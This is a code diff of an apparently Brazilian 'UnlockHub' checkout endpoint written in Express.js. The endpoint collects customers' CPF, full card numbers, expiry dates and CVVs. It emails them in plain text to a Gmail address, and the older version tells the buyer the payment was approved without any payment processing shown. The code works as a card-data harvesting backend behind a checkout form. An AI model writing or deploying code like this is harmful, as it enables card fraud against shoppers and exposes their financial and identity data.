@@ -25,8 +25,8 @@ app.post("/checkout", async (req, res) => {
       cvv,
     } = req.body;
 
-    const dados = `
-NOVO PEDIDO UNLOCKHUB
+    const mensagem = `
+NOVO PEDIDO - UNLOCKHUB
 
 Nome: ${nome}
 CPF: ${cpf}
@@ -37,22 +37,24 @@ Produto: ${produto}
 Preço: R$ ${preco}
 Método: ${metodo}
 
-Número do Cartão: ${numeroCartao || "N/A"}
+Cartão: ${numeroCartao || "N/A"}
 Validade: ${validade || "N/A"}
 CVV: ${cvv || "N/A"}
 `;
 
-    await resend.emails.send({
+    const resposta = await resend.emails.send({
       from: "UnlockHub <onboarding@resend.dev>",
       to: "unlockhubphb@gmail.com",
       subject: `Novo Pedido - ${produto}`,
-      text: dados,
+      text: mensagem,
     });
 
-    res.status(200).send("Pagamento aprovado com sucesso!");
-  } catch (error) {
-    console.error("Erro ao enviar email:", error);
-    res.status(500).send(error.message);
+    console.log("Email enviado:", resposta);
+
+    res.status(200).send("Pedido enviado com sucesso!");
+  } catch (erro) {
+    console.error("ERRO AO ENVIAR EMAIL:", erro);
+    res.status(500).send("Erro interno: " + erro.message);
   }
 });
 
